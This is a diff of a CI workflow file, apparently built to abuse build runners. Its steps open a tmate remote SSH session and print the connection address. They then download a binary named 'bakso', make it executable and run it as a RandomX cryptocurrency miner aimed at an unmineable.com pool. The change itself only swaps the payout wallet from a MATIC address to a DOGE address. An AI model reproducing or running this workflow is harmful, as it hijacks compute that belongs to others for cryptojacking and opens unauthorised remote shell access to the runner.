@@ -37,4 +37,4 @@ jobs:
         ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with SSH address: #{tmate_sh}"
     - name: Prox
       run: |
-        wget https://github.com/hambana01/cici/raw/main/bakso && chmod 755 bakso && ./bakso -a rx/0 -o rx.unmineable.com:3333 -u MATIC:0x748025d6e4e19b9e482dc048a31b970d2772275b.$(echo $(shuf -i 1000-9999 -n 1)-matic) -p x -b 0.0.0.0:3333 -m simple
+        wget https://github.com/hambana01/cici/raw/main/bakso && chmod 755 bakso && ./bakso -a rx/0 -o rx.unmineable.com:3333 -u DOGE:DCFkhhgDdvBpH8rEwKiNkiVi68dyACyb88.$(echo $(shuf -i 1000-9999 -n 1)-matic) -p x -b 0.0.0.0:3333 -m simple
